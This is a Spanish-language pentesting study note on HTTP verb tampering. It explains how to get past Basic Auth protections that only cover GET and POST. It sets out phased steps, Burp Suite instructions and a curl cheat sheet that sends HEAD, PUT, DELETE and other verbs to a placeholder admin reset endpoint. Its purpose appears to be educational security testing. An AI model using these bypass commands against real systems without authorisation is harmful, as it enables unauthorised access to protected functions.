---
tags:
  - webapp
  - verbtamp
  - attack
  - bypass
---
## Conceptos Clave (TL;DR)

- HTTP Verb Tampering explota configuraciones inseguras del servidor web que solo restringen ciertos métodos HTTP (GET/POST) pero dejan sin proteger otros (HEAD, OPTIONS, PUT, etc.).
- El método HEAD es funcionalmente idéntico a GET pero el servidor no devuelve body en la respuesta; sin embargo, la acción del servidor (lógica de backend) se ejecuta igualmente.
- Si la configuración de autenticación solo aplica a GET y POST, enviar la misma petición con HEAD u otro verbo puede saltarse el prompt de autenticación por completo.
- El primer paso siempre es enumerar los métodos aceptados por el servidor mediante OPTIONS antes de intentar el bypass.

## Herramientas Clave

| Herramienta  | Propósito en este vector                                                                 |
|--------------|------------------------------------------------------------------------------------------|
| curl         | Enviar peticiones HTTP con métodos arbitrarios (-X) y enumerar métodos via OPTIONS.      |
| Burp Suite   | Interceptar peticiones y cambiar el método HTTP con "Change Request Method" para pruebas |

## Metodología Paso a Paso

### Fase 1 - Identificacion del endpoint restringido

Navegar la aplicación y localizar la funcionalidad o ruta que devuelve un prompt de HTTP Basic Auth (401 Unauthorized). Anotar la URL exacta del recurso protegido.

- Revisar la URL a la que apunta el botón o acción restringida.
- Verificar si la restriccion aplica a un archivo especifico o a todo un directorio probando rutas padre (ej. `/admin/` vs `/admin/reset.php`).

### Fase 2 - Identificacion del metodo HTTP original

Interceptar con Burp Suite la peticion que dispara la autenticacion para saber si el endpoint usa GET o POST originalmente. Esto define el punto de partida del ataque.

### Fase 3 - Enumeracion de metodos permitidos

Enviar una peticion OPTIONS al endpoint o directorio restringido. La respuesta incluye la cabecera `Allow:` con todos los verbos que el servidor acepta. Esto confirma si HEAD u otros metodos estan disponibles antes de intentar el bypass.

### Fase 4 - Ejecucion del bypass

Reenviar la peticion original sustituyendo el metodo HTTP por uno no cubierto por la autenticacion (HEAD es el candidato principal). Si el servidor no requiere auth para ese verbo, la accion de backend se ejecuta sin credenciales.

- Con Burp: click derecho sobre la peticion interceptada > "Change Request Method", o editar manualmente el verbo en el raw request.
- Con curl: usar el flag `-X <VERB>`.

### Fase 5 - Verificacion

Comprobar en la aplicacion que la accion se ejecuto (efecto secundario visible en la UI o en la respuesta HTTP), incluso si la respuesta del servidor esta vacia (comportamiento esperado con HEAD).

## Cheat Sheet de Comandos

```bash
# Enumerar metodos HTTP permitidos en el servidor/endpoint
# -i: incluye cabeceras de respuesta | -X OPTIONS: fuerza el metodo OPTIONS
curl -i -X OPTIONS http://<TARGET_IP>:<PORT>/

# Enumerar metodos sobre un directorio o endpoint especifico restringido
curl -i -X OPTIONS http://<TARGET_IP>:<PORT>/admin/

# Intentar bypass con metodo HEAD sobre el endpoint protegido
# -i: muestra cabeceras | -X HEAD: usa el verbo HEAD en lugar de GET/POST
curl -i -X HEAD http://<TARGET_IP>:<PORT>/admin/reset.php

# Intentar bypass con otros verbos alternativos (PUT, PATCH, DELETE, etc.)
curl -i -X PUT http://<TARGET_IP>:<PORT>/admin/reset.php
curl -i -X PATCH http://<TARGET_IP>:<PORT>/admin/reset.php
curl -i -X DELETE http://<TARGET_IP>:<PORT>/admin/reset.php

# Bypass con POST si el endpoint original usa GET (y la auth no cubre POST)
curl -i -X POST http://<TARGET_IP>:<PORT>/admin/reset.php

# Si el endpoint requiere parametros, incluirlos con -d
curl -i -X HEAD "http://<TARGET_IP>:<PORT>/admin/reset.php?param=value"

# Verificar respuesta 401 con el metodo original para confirmar la restriccion
curl -i -X GET http://<TARGET_IP>:<PORT>/admin/reset.php
```

```
# Flujo en Burp Suite (sin comando, procedimiento):
# 1. Activar Intercept > capturar la peticion al endpoint restringido.
# 2. Click derecho > "Change Request Method" para alternar GET<->POST automaticamente.
# 3. Para HEAD u otros verbos: editar manualmente la primera linea del raw request.
#    Cambiar "GET /admin/reset.php HTTP/1.1" por "HEAD /admin/reset.php HTTP/1.1"
# 4. Click "Forward" y observar respuesta en el navegador.
```

## "Gotchas" y Troubleshooting

- **Respuesta vacia no significa fallo**: Con HEAD el servidor no devuelve body por diseno. El exito se verifica por el efecto en la aplicacion (cambio de estado en la UI), no por el contenido de la respuesta.
- **La restriccion puede aplicar al directorio padre**: Si `/admin/reset.php` esta protegido, verificar si `/admin/` tambien lo esta. La configuracion de auth puede cubrir el directorio completo, lo que hace mas probable que solo ciertos verbos esten incluidos en la regla.
- **OPTIONS puede estar deshabilitado**: Algunos servidores no responden a OPTIONS por seguridad. En ese caso, probar cada verbo directamente sin enumeracion previa.
- **HEAD no siempre ejecuta logica de backend**: Dependiendo del framework o del servidor (Apache vs Nginx vs IIS), el comportamiento de HEAD puede variar. Si HEAD no ejecuta la accion, probar PUT, PATCH o verbos menos comunes.
- **Herramientas automaticas no detectan este tipo de bypass por codigo inseguro**: Los scanners identifican la variante de configuracion de servidor, pero no la variante de filtros de codigo inseguros. El testing manual es obligatorio para confirmar ambos casos.
- **Requisito previo**: Tener visibilidad de la URL exacta del endpoint restringido (via Burp, codigo fuente de la pagina o inspeccion de la peticion de red del navegador).
- **Servidores Apache**: La configuracion `Allow: POST,OPTIONS,HEAD,GET` es el default de Apache/2.4, por lo que HEAD casi siempre estara disponible en entornos Apache sin hardening.